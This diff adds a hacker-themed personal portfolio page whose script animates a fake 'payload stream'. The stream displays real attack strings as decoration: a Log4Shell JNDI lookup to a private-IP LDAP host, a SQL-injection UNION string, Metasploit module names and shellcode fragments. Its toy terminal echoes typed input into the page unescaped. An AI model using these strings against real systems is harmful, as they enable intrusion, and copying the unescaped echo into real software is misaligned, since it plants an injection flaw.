@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYB3RMETH0D // SYSTEM BREACH</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+
+        :root {
+            --neon-green: #00ff41;
+            --dark-green: #003b00;
+            --alert-red: #ff003c;
+            --cyber-cyan: #00f3ff;
+            --bg-black: #050505;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-black);
+            color: var(--neon-green);
+            font-family: 'Fira Code', monospace;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Efecto Scanlines CRT */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.35) 50%),
+                        linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.04));
+            z-index: 999;
+            background-size: 100% 3px, 6px 100%;
+            pointer-events: none;
+        }
+
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.22;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 950px;
+            background: rgba(5, 10, 5, 0.88);
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.2), inset 0 0 15px rgba(0, 255, 65, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        /* Barra superior ventana */
+        .top-bar {
+            background: #0a140a;
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--neon-green);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+        }
+
+        .dots {
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--dark-green);
+            border: 1px solid var(--neon-green);
+        }
+
+        .dot.red { background: var(--alert-red); border-color: var(--alert-red); box-shadow: 0 0 8px var(--alert-red); }
+        .status-badge {
+            color: var(--alert-red);
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        /* Cabecera Glitch */
+        .header {
+            padding: 30px 25px 15px;
+            border-bottom: 1px dashed var(--dark-green);
+        }
+
+        .glitch {
+            font-size: clamp(1.8rem, 4vw, 3rem);
+            font-weight: 700;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 rgba(255, 0, 60, 0.75), -0.05em -0.025em 0 rgba(0, 243, 255, 0.75);
+            animation: glitch 725ms infinite;
+        }
+
+        .subtitle {
+            color: var(--cyber-cyan);
+            margin-top: 8px;
+            font-size: 0.95rem;
+        }
+
+        /* Grid principal */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1.3fr;
+            gap: 20px;
+            padding: 25px;
+        }
+
+        @media (max-width: 768px) {
+            .grid { grid-template-columns: 1fr; }
+        }
+
+        .panel {
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            background: rgba(0, 15, 0, 0.6);
+            padding: 15px;
+            border-radius: 3px;
+        }
+
+        .panel-title {
+            font-size: 0.8rem;
+            color: var(--cyber-cyan);
+            border-bottom: 1px solid rgba(0, 243, 255, 0.3);
+            padding-bottom: 6px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        /* Consola de Payloads */
+        #payload-feed {
+            height: 240px;
+            overflow-y: hidden;
+            font-size: 0.82rem;
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .log-line { margin-bottom: 4px; word-break: break-all; }
+        .log-warn { color: #ffcc00; }
+        .log-crit { color: var(--alert-red); font-weight: bold; }
+        .log-sys { color: var(--cyber-cyan); }
+
+        /* Barra de progreso del payload activo */
+        .progress-wrapper {
+            margin-top: 12px;
+            border: 1px solid var(--neon-green);
+            padding: 3px;
+        }
+
+        .progress-bar {
+            height: 10px;
+            width: 0%;
+            background: var(--neon-green);
+            box-shadow: 0 0 10px var(--neon-green);
+            transition: width 0.1s linear;
+        }
+
+        /* Enlaces / Proyectos */
+        .nav-links {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .nav-links a {
+            display: block;
+            padding: 10px 12px;
+            color: var(--neon-green);
+            text-decoration: none;
+            border: 1px solid var(--dark-green);
+            background: rgba(0, 255, 65, 0.03);
+            transition: all 0.2s;
+            font-size: 0.9rem;
+        }
+
+        .nav-links a:hover {
+            background: var(--neon-green);
+            color: var(--bg-black);
+            font-weight: bold;
+            box-shadow: 0 0 15px var(--neon-green);
+            transform: translateX(5px);
+        }
+
+        /* Terminal interactiva */
+        .terminal-box {
+            margin: 0 25px 25px;
+            border: 1px solid var(--neon-green);
+            background: #020602;
+            padding: 15px;
+        }
+
+        #terminal-output {
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+            max-height: 130px;
+            overflow-y: auto;
+            color: #b5ffb5;
+        }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .prompt { color: var(--alert-red); font-weight: bold; }
+
+        #cmd-input {
+            background: transparent;
+            border: none;
+            color: var(--neon-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            width: 100%;
+            outline: none;
+        }
+
+        /* Popup de alerta de payload */
+        #payload-toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(20, 0, 5, 0.95);
+            border: 1px solid var(--alert-red);
+            color: var(--alert-red);
+            padding: 12px 18px;
+            font-size: 0.8rem;
+            box-shadow: 0 0 20px rgba(255, 0, 60, 0.4);
+            z-index: 100;
+            transform: translateX(150%);
+            transition: transform 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+        }
+
+        #payload-toast.active {
+            transform: translateX(0);
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0.2; }
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 rgba(255,0,60,.75), -0.05em -0.025em 0 rgba(0,243,255,.75); }
+            15% { text-shadow: -0.05em -0.025em 0 rgba(255,0,60,.75), 0.025em 0.025em 0 rgba(0,243,255,.75); }
+            50% { text-shadow: 0.025em 0.05em 0 rgba(255,0,60,.75), 0.05em 0 0 rgba(0,243,255,.75); }
+            100% { text-shadow: -0.025em 0 0 rgba(255,0,60,.75), -0.025em -0.025em 0 rgba(0,243,255,.75); }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix-canvas"></canvas>
+
+    <div class="container">
+        <div class="top-bar">
+            <div class="dots">
+                <span class="dot red"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span style="margin-left: 10px;">root@cyb3rmeth0d:~# ./exploit.sh</span>
+            </div>
+            <div class="status-badge">[● LIVE INJECTION]</div>
+        </div>
+
+        <div class="header">
+            <h1 class="glitch">CYB3RMETH0D</h1>
+            <p class="subtitle">&gt; Security Researcher // Exploit Dev // Cyber Operations</p>
+        </div>
+
+        <div class="grid">
+            <!-- Panel Izquierdo: Navegación -->
+            <div class="panel">
+                <div class="panel-title">
+                    <span>DIRECTORY_TREE</span>
+                    <span>[rwxr-xr-x]</span>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="https://github.com/cyb3rmeth0d" target="_blank">[01] GITHUB_REPOSITORIES</a></li>
+                    <li><a href="#" onclick="triggerManualPayload(); return false;">[02] FORCE_PAYLOAD_EXEC()</a></li>
+                    <li><a href="#" onclick="runCommand('projects'); return false;">[03] VIEW_EXPLOITS_&_TOOLS</a></li>
+                    <li><a href="#" onclick="runCommand('contact'); return false;">[04] ENCRYPTED_COMMS</a></li>
+                </ul>
+            </div>
+
+            <!-- Panel Derecho: Carga constante de Payloads -->
+            <div class="panel">
+                <div class="panel-title">
+                    <span>PAYLOAD_STREAM_DAEMON</span>
+                    <span id="payload-counter">LOADED: 0</span>
+                </div>
+                <div id="payload-feed"></div>
+                <div class="progress-wrapper">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Terminal Interactiva -->
+        <div class="terminal-box">
+            <div id="terminal-output">
+                <div>Bienvenido al nodo central de <b>cyb3rmeth0d</b>. Escribe <span style="color:var(--cyber-cyan)">help</span> para ver los comandos disponibles.</div>
+            </div>
+            <div class="input-line">
+                <span class="prompt">root@cyb3rmeth0d:~$</span>
+                <input type="text" id="cmd-input" placeholder="Escribe un comando (ej: help, whoami, payload)..." autocomplete="off">
+            </div>
+        </div>
+    </div>
+
+    <!-- Notificación emergente de payload -->
+    <div id="payload-toast">
+        <strong>[!] PAYLOAD INJECTED</strong><br>
+        <span id="toast-msg">reverse_tcp_x64.bin -> 192.168.1.104</span>
+    </div>
+
+    <script>
+        // 1. EFECTO LLUVIA MATRIX
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEF';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(5, 5, 5, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 40);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // 2. SIMULADOR DE CARGA DE PAYLOADS CADA POCOS SEGUNDOS
+        const feed = document.getElementById('payload-feed');
+        const progressBar = document.getElementById('progress-bar');
+        const counterEl = document.getElementById('payload-counter');
+        const toast = document.getElementById('payload-toast');
+        const toastMsg = document.getElementById('toast-msg');
+
+        let payloadCount = 0;
+
+        const payloads = [
+            { name: "linux/x64/meterpreter/reverse_tcp", target: "10.0.14.88:4444", hex: "\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2" },
+            { name: "exploit/multi/http/log4shell_rce", target: "api.internal.corp:8080", hex: "${jndi:ldap://192.168.0.12:1389/a}" },
+            { name: "windows/smb/ms17_010_eternalblue", target: "172.16.32.5:445", hex: "\\x90\\x90\\x90\\xeb\\x1e\\x5e\\x31\\xc0\\xb0" },
+            { name: "bypass/waf/sqli_polyglot_v4.bin", target: "auth-db-prod:3306", hex: "' OR 1=1 UNION SELECT NULL,version()--" },
+            { name: "kernel/priv_esc/dirty_pipe_cve", target: "uid=0(root) gid=0(root)", hex: "\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00" },
+            { name: "crypto/aes256_bruteforce_gpu.so", target: "hash_dump_0x9F2A.bin", hex: "0x8f4e2b91c0a77d1e3b5c99a01f4d2e" }
+        ];
+
+        function addLog(text, type = '') {
+            const div = document.createElement('div');
+            div.className = 'log-line ' + type;
+            const time = new Date().toTimeString().split(' ')[0];
+            div.innerHTML = `[${time}] ${text}`;
+            feed.appendChild(div);
+            if (feed.children.length > 14) {
+                feed.removeChild(feed.firstChild);
+            }
+        }
+
+        function showToast(msg) {
+            toastMsg.textContent = msg;
+            toast.classList.add('active');
+            setTimeout(() => toast.classList.remove('active'), 2600);
+        }
+
+        function launchPayloadCycle() {
+            const p = payloads[Math.floor(Math.random() * payloads.length)];
+            addLog(`Fetching payload: <span class="log-sys">${p.name}</span>`);
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 25) + 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    progressBar.style.width = '100%';
+                    clearInterval(interval);
+
+                    payloadCount++;
+                    counterEl.textContent = `LOADED: ${payloadCount}`;
+                    addLog(`Shellcode: <span class="log-warn">${p.hex}</span>`);
+                    addLog(`EXEC SUCCESS -> <span class="log-crit">${p.target}</span>`);
+                    showToast(`${p.name} -> ${p.target}`);
+
+                    setTimeout(() => {
+                        progressBar.style.width = '0%';
+                    }, 600);
+                } else {
+                    progressBar.style.width = progress + '%';
+                }
+            }, 180);
+        }
+
+        function triggerManualPayload() {
+            addLog(`MANUAL OVERRIDE DETECTED...`, 'log-crit');
+            launchPayloadCycle();
+        }
+
+        // Arranca uno al entrar y repite cada 4.5 segundos
+        setTimeout(launchPayloadCycle, 600);
+        setInterval(launchPayloadCycle, 4500);
+
+        // 3. TERMINAL INTERACTIVA
+        const cmdInput = document.getElementById('cmd-input');
+        const termOutput = document.getElementById('terminal-output');
+
+        const commands = {
+            help: "Comandos disponibles: <span style='color:#00f3ff'>whoami</span>, <span style='color:#00f3ff'>projects</span>, <span style='color:#00f3ff'>payload</span>, <span style='color:#00f3ff'>contact</span>, <span style='color:#00f3ff'>clear</span>",
+            whoami: "Alias: <b>cyb3rmeth0d</b> | Rol: Pentester & Desarrollador | Estado: Conectado a la red.",
+            projects: "Repositorios activos: [1] Auto-Recon Scanner [2] Custom C2 Framework [3] Buffer Overflow Labs. Visita github.com/cyb3rmeth0d para el código fuente.",
+            contact: "PGP Fingerprint: 4A9F 88C1 00E2 77B1 | GitHub: @cyb3rmeth0d",
+            payload: "Inyectando payload bajo demanda en el stream principal..."
+        };
+
+        function runCommand(cmd) {
+            const cleanCmd = cmd.trim().toLowerCase();
+            if (!cleanCmd) return;
+
+            termOutput.innerHTML += `<div><span style="color:#ff003c">root@cyb3rmeth0d:~$</span> ${cleanCmd}</div>`;
+
+            if (cleanCmd === 'clear') {
+                termOutput.innerHTML = '';
+                return;
+            }
+
+            if (cleanCmd === 'payload') {
+                triggerManualPayload();
+            }
+
+            const response = commands[cleanCmd] || `Comando no reconocido: '${cleanCmd}'. Escribe <b>help</b>.`;
+            termOutput.innerHTML += `<div style="margin-bottom:8px;">${response}</div>`;
+            termOutput.scrollTop = termOutput.scrollHeight;
+        }
+
+        cmdInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                runCommand(cmdInput.value);
+                cmdInput.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
